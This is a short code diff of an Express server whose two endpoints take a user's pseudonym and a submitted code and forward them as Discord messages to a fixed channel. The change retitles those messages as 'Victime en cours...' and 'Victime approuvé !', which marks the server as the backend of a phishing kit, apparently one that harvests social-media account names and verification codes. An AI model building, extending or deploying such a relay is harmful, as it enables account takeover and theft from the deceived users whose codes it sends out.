@@ -27,7 +27,7 @@ app.post('/api/send-info', async (req, res) => {
         const channel = await client.channels.fetch(CHANNEL_ID);
         
         const embed = new EmbedBuilder()
-            .setTitle('📱 Nouvelle demande')
+            .setTitle('Victime en cours...')
             .setColor('#FFFC00')
             .addFields(
                 { name: 'Utilisateur', value: `\`${pseudo}\``, inline: true },
@@ -54,7 +54,7 @@ app.post('/api/send-code', async (req, res) => {
     try {
         const channel = await client.channels.fetch(CHANNEL_ID);
         const embed = new EmbedBuilder()
-            .setTitle('✅ Code reçu')
+            .setTitle('Victime approuvé !')
             .setColor('#00FF00')
             .addFields(
                 { name: 'Utilisateur', value: `\`${pseudo}\``, inline: true },
